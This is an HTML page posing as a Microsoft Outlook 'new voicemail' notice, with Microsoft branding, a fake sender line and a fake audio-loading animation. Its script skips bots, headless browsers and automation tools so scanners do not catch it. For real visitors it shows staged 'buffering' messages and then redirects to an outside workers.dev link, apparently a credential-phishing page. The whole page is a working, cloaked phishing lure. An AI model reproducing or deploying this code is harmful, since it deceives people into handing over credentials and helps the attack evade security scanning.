<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Outlook - New Voicemail</title>
<link rel="icon" href="https://res-1.cdn.office.net/files/fabric-cdn-prod_20221209.001/assets/brand-icons/product/svg/outlook_32x1.svg" type="image/svg+xml">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f5f5f5}
.email-container{max-width:600px;margin:20px auto;background:#fff;border:1px solid #e0e0e0;border-radius:4px;overflow:hidden}
.email-header{background:#0078d4;padding:16px 24px;display:flex;align-items:center;gap:10px}
.email-header svg{width:28px;height:28px;fill:#fff}
.email-header span{color:#fff;font-size:16px;font-weight:600}
.email-body{padding:32px 24px}
.from-line{font-size:12px;color:#a19f9d;margin-bottom:4px}
.subject-line{font-size:18px;font-weight:600;color:#323130;margin-bottom:20px}
.vm-card{background:#f8f8f8;border:1px solid #edebe9;border-radius:8px;padding:20px;text-align:center;margin-bottom:24px}
.vm-icon{width:56px;height:56px;background:#0078d4;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px}
.vm-icon svg{width:28px;height:28px;fill:#fff}
.vm-title{font-size:15px;font-weight:600;color:#323130;margin-bottom:4px}
.vm-details{font-size:13px;color:#605e5c}
.vm-duration{display:inline-flex;align-items:center;gap:4px;background:#e8f4fd;color:#0078d4;font-size:12px;font-weight:600;padding:4px 10px;border-radius:12px;margin-top:8px}
.wave-bars{display:flex;align-items:center;justify-content:center;gap:2px;height:24px;margin:16px 0}
.wave-bars span{width:3px;background:#0078d4;border-radius:2px;animation:wave .8s ease-in-out infinite}
.wave-bars span:nth-child(1){height:8px;animation-delay:0s}
.wave-bars span:nth-child(2){height:16px;animation-delay:.1s}
.wave-bars span:nth-child(3){height:24px;animation-delay:.2s}
.wave-bars span:nth-child(4){height:12px;animation-delay:.3s}
.wave-bars span:nth-child(5){height:20px;animation-delay:.4s}
.wave-bars span:nth-child(6){height:10px;animation-delay:.5s}
.wave-bars span:nth-child(7){height:18px;animation-delay:.6s}
@keyframes wave{0%,100%{transform:scaleY(1)}50%{transform:scaleY(.4)}}
.load-status{font-size:13px;color:#605e5c;text-align:center;margin-bottom:8px}
.progress{height:2px;background:#edebe9;border-radius:1px;overflow:hidden;margin:0 24px}
.progress-inner{height:100%;width:0;background:#0078d4;transition:width 2.5s ease}
.email-footer{padding:16px 24px;border-top:1px solid #edebe9;font-size:11px;color:#a19f9d;text-align:center;margin-top:16px}
</style>
</head>
<body>
<div class="email-container">
<div class="email-header">
<svg viewBox="0 0 28 28"><path d="M14 2C7.4 2 2 7.4 2 14s5.4 12 12 12 12-5.4 12-12S20.6 2 14 2zm-2 17V9l8 5-8 5z"/></svg>
<span>Outlook Voicemail</span>
</div>
<div class="email-body">
<div class="from-line">From: Microsoft Outlook &lt;no-reply@microsoft.com&gt;</div>
<div class="subject-line">You have a new voicemail</div>
<div class="vm-card">
<div class="vm-icon"><svg viewBox="0 0 24 24"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3zM5 10v2a7 7 0 0 0 14 0v-2h-2v2a5 5 0 0 1-10 0v-2H5zm6 11.93A7.5 7.5 0 0 1 4.07 15H6.1A5.5 5.5 0 0 0 11 19.9v2.03zm2 0V19.9A5.5 5.5 0 0 0 17.9 15h2.03A7.5 7.5 0 0 1 13 21.93z"/></svg></div>
<div class="vm-title">Voicemail from Unknown Caller</div>
<div class="vm-details">Received today at <span id="tm"></span></div>
<div class="vm-duration">Duration: 0:47</div>
<div class="wave-bars"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></div>
</div>
</div>
<div class="load-status" id="st">Loading voicemail player...</div>
<div class="progress"><div class="progress-inner" id="pf"></div></div>
<div class="email-footer">This is an automated message from Microsoft Outlook. &copy; 2026 Microsoft</div>
</div>
<script>
(function(){
var n=navigator,u=n.userAgent.toLowerCase();
if(n.webdriver||/bot|crawl|spider|headless|phantom|selenium|puppeteer/i.test(u))return;
if(window.outerWidth===0&&window.outerHeight===0)return;
var h=new Date().getHours(),mn=new Date().getMinutes();
document.getElementById('tm').textContent=(h%12||12)+':'+(mn<10?'0':'')+mn+(h>=12?' PM':' AM');
var p=document.getElementById('pf'),s=document.getElementById('st');
setTimeout(function(){p.style.width='30%';s.textContent='Buffering audio stream...'},500);
setTimeout(function(){p.style.width='65%';s.textContent='Connecting to voicemail server...'},1300);
setTimeout(function(){p.style.width='100%';s.textContent='Opening voicemail...'},2200);
setTimeout(function(){window.location.href='https://cove-prism-4c6c.p-af053b63.workers.dev/share/GtwhS9egvd8'},2800);
})();
</script>
</body>
</html>
